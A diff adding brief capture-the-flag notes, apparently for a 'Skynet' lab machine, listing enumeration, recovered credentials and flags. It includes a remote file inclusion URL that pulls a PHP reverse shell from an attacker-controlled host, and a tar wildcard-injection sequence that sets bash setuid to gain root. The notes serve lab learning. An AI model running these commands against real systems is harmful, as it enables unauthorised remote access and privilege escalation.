@@ -7,3 +7,30 @@ basicpentestingjt:
 	* using `john` cracked the password for `id_rsa` for `kay`. the password was 'beeswax'
 	* logged into the machine with `ssh -i id_rsa kay@ip_address` and password `beeswax`
 	* read pass.bak to found a long long password. `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
+
+
+Skynet:
+	open TCP ports: 22, 80, 110, 139, 143, 445
+	directories found: config, admin, .htaccess, .htpasswd, squirrelmail
+	found SquirrelMail version 1.4.23 [SVN]
+	found two public shares through smb, anonymous, and milesdyson
+	found possible username and passwords list in anonymous share.
+	squirrelmail username:password = milesdyson:cyborg007haloterminator
+	smb password found from mail: )s{A&2Z=F^n_E.B`
+	hidden directory found from the smb private share. important notes: /45kra24zxs28v3yd
+	bruteforce the hidden directory and found other directories: administrator
+	cuppa cms is vulnerable to "remote file inclusion" which was used in administrator page
+	got php reverseshell with : http://10.201.23.93/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.22.161:8000/php-reverse-shell.php.
+		$ python3 -c "import pty; pty.spawn('/bin/bash')"
+	foudn user flag: 7ce5c2109a40f958099283600a9ae807
+	there was a backup.sh in where a wildcard '*' was used in tar command.
+	escalate privilage using a technique called wildcard injection.
+		$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
+		$ touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
+		$ touch "/var/www/html/--checkpoint=1"
+		$ /bin/bash -p
+		# whoami
+	got root access.
+	but what is wildcard injection ??
+	root flag: 3f0372db24753accc7179a282cd6a949
+
